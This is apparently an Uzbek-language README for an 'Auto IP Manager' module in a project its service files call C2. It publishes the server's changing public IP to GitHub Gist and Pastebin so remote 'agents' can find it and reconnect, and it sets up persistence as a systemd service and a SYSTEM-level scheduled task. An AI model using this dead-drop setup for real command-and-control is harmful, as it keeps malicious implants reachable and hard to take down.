# 🤖 Auto IP Manager - Qo'llanma

## 📖 Nima Qiladi?

Server o'z public IP sini avtomatik:
- ✅ Aniqlaydi
- ✅ O'zgarishni kuzatadi  
- ✅ GitHub Gist ga upload qiladi
- ✅ Pastebin ga upload qiladi
- ✅ Agent'lar yangi IP ni topadi

---

## 🚀 Quick Start

### 1. Setup (Birinchi Marta)

```bash
python common/auto_ip_manager.py setup
```

**Setup wizard:**
1. Hozirgi IP ni aniqlaydi
2. Portlarni so'raydi (TCP, HTTP, etc.)
3. Backup IP lar (optional)
4. GitHub Gist setup (token)
5. Pastebin setup (API key)
6. Check interval (default: 5 daqiqa)
7. Monitoring boshlaydi

---

### 2. IP Tekshirish (Test)

```bash
python common/auto_ip_manager.py check
```

Faqat public IP ni ko'rsatadi.

---

### 3. Monitoring (Auto)

```bash
python common/auto_ip_manager.py
```

Config mavjud bo'lsa avtomatik monitoring boshlaydi.

---

## 📝 GitHub Gist Setup

### Token Olish:

1. **GitHub ga kiring:** https://github.com/settings/tokens

2. **"Generate new token (classic)" ni bosing**

3. **Permissions tanlang:**
   - ✅ `gist` - Create gists

4. **"Generate token" bosing**

5. **Token ni nusxalang** (faqat bir marta ko'rsatiladi!)

### Setup'da ishlatish:

```
GitHub Gist ishlatilsinmi? [y/N]: y
Token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Mavjud Gist ID (yangi: Enter): [Enter]
```

### Natija:

```
✅ SUCCESS!
Gist URL: https://gist.github.com/username/abc123
Raw URL: https://gist.githubusercontent.com/username/abc123/raw/server_config.json

📋 Agent'da ishlatish:
client.add_ip_update_source('github_gist',
    'https://gist.githubusercontent.com/username/abc123/raw/server_config.json')
```

---

## 📋 Pastebin Setup

### API Key Olish:

1. **Pastebin ga kiring:** https://pastebin.com/doc_api

2. **"Your Unique Developer API Key" ni topib nusxalang**

### Setup'da ishlatish:

```
Pastebin ishlatilsinmi? [y/N]: y
API Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Natija:

```
✅ SUCCESS!
Paste URL: https://pastebin.com/abc123
Raw URL: https://pastebin.com/raw/abc123

📋 Agent'da ishlatish:
client.add_ip_update_source('pastebin',
    'https://pastebin.com/raw/abc123')
```

---

## ⚙️ Config File Format

`ip_config.json`:

```json
{
  "current_ip": "123.45.67.89",
  "backup_ips": [
    "98.76.54.32"
  ],
  "ports": {
    "tcp": 9999,
    "http": 8080,
    "https": 8443,
    "websocket": 8765
  },
  "github_token": "ghp_xxxxxxxxxxxx",
  "github_gist_id": "abc123def456",
  "pastebin_api_key": "xxxxxxxxxxxxxxxx",
  "last_updated": "2025-12-23 15:30:00"
}
```

---

## 🔄 Monitoring Process

```
[2025-12-23 15:30:00] ✓ IP o'zgarmagan: 123.45.67.89
   Keyingi tekshiruv: 300 sekunddan keyin...

[2025-12-23 15:35:00] ⚠️ IP O'ZGARDI!

🔄 IP o'zgardi: 123.45.67.89 → 98.76.54.32
📤 GitHub Gist ga yuklanmoqda...
✅ GitHub Gist yangilandi!
   Gist URL: https://gist.github.com/user/id
   Raw URL: https://gist.githubusercontent.com/.../server_config.json

📤 Pastebin ga yuklanmoqda...
✅ Pastebin yangilandi!
   Paste URL: https://pastebin.com/abc123
   Raw URL: https://pastebin.com/raw/abc123
```

---

## 🎯 Agent Integration

Agent'da yangi IP ni avtomatik topish:

```python
from agent.smart_client import SmartClient

client = SmartClient()

# Primary server (DDNS yoki static)
client.add_server('yourname.duckdns.org', 9999)

# GitHub Gist orqali IP update
client.add_ip_update_source('github_gist',
    'https://gist.githubusercontent.com/user/id/raw/server_config.json')

# Pastebin orqali IP update (backup)
client.add_ip_update_source('pastebin',
    'https://pastebin.com/raw/abc123')

# Har 5 daqiqada yangi IP tekshiriladi
client.run()
```

---

## 📊 Workflow

```
┌─────────────────────────────────────────┐
│  1. Server Start                        │
│  • auto_ip_manager.py ishga tushadi     │
│  • Public IP aniqlaydi: 123.45.67.89    │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  2. Initial Upload                      │
│  • GitHub Gist ga upload                │
│  • Pastebin ga upload                   │
│  • Config saqlaydi                      │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  3. Monitoring (har 5 daqiqa)           │
│  • Public IP tekshiriladi               │
│  • O'zgarish yo'q → skip                │
│  • O'zgarish bor → step 4               │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  4. IP Changed (ISP restart)            │
│  • Old: 123.45.67.89                    │
│  • New: 98.76.54.32                     │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  5. Auto Update                         │
│  • GitHub Gist yangilanadi              │
│  • Pastebin yangilanadi                 │
│  • Config yangilanadi                   │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  6. Agent Auto-Connect                  │
│  • Agent 5 daqiqada tekshiradi          │
│  • Yangi IP ni topadi                   │
│  • Qayta ulanadi                        │
└─────────────────────────────────────────┘
```

---

## 🛠️ Manual Config Edit

Agar setup wizard ishlatmasangiz, qo'lda yaratish:

```bash
# ip_config.json yarating
nano ip_config.json
```

```json
{
  "current_ip": null,
  "backup_ips": [],
  "ports": {
    "tcp": 9999,
    "http": 8080,
    "https": 8443,
    "websocket": 8765
  },
  "github_token": "YOUR_TOKEN",
  "github_gist_id": null,
  "pastebin_api_key": "YOUR_KEY",
  "last_updated": null
}
```

Keyin monitoring boshlang:

```bash
python common/auto_ip_manager.py
```

---

## 🔧 Advanced Usage

### Python Script'da ishlatish:

```python
from common.auto_ip_manager import AutoIPManager, PublicIPDetector

# IP aniqlash
current_ip = PublicIPDetector.get_public_ip()
print(f"Public IP: {current_ip}")

# Manager yaratish
manager = AutoIPManager()
manager.setup_github('YOUR_TOKEN', 'GIST_ID')
manager.setup_pastebin('YOUR_API_KEY')

# IP o'zgarishini tekshirish
changed, new_ip = manager.detect_ip_change()

if changed:
    # Yangilash
    manager.update_ip(new_ip)

# Yoki monitoring
manager.monitor()
```

---

## 🎯 Production Setup

### Background Service (Linux):

```bash
# systemd service yaratish
sudo nano /etc/systemd/system/auto-ip-manager.service
```

```ini
[Unit]
Description=C2 Auto IP Manager
After=network.target

[Service]
Type=simple
User=your_user
WorkingDirectory=/path/to/c2
ExecStart=/usr/bin/python3 /path/to/c2/common/auto_ip_manager.py
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
# Enable va start
sudo systemctl enable auto-ip-manager
sudo systemctl start auto-ip-manager

# Status
sudo systemctl status auto-ip-manager
```

### Windows Task Scheduler:

```batch
# Task yaratish
schtasks /create /tn "C2 Auto IP Manager" /tr "python D:\github\c2\common\auto_ip_manager.py" /sc onstart /ru SYSTEM
```

---

## 💡 Tips

1. **GitHub Gist**: Private gist ishlatng (public xavfli)
2. **Check Interval**: 5 daqiqa optimal (tez-tez check qilmang)
3. **Backup**: Pastebin ham qo'shing (GitHub ishlamasa)
4. **Token Security**: Environment variable ishlatng
5. **Monitoring**: nohup yoki screen ishlatng (Linux)

---

## 🐛 Troubleshooting

### "Public IP ni olib bo'lmadi"

**Sabab:** Barcha IP services ishlamayapti

**Yechim:**
```bash
# Manual tekshirish
curl https://api.ipify.org
curl https://ifconfig.me/ip
```

### "GitHub Gist xatosi: 401"

**Sabab:** Token noto'g'ri yoki permission yo'q

**Yechim:**
- Token'ni qayta tekshiring
- `gist` permission borligini tasdiqlang

### "Pastebin xatosi: invalid api_dev_key"

**Sabab:** API key noto'g'ri

**Yechim:**
- https://pastebin.com/doc_api dan yangi key oling

---

## 📚 Qo'shimcha

- **IP Updater:** [common/ip_updater.py](../common/ip_updater.py)
- **Smart Client:** [agent/smart_client.py](../agent/smart_client.py)
- **DDNS Guide:** [DYNAMIC_IP_GUIDE.md](DYNAMIC_IP_GUIDE.md)

---

✅ **Tayyor!** Server IP avtomatik yangilanadi! 🚀
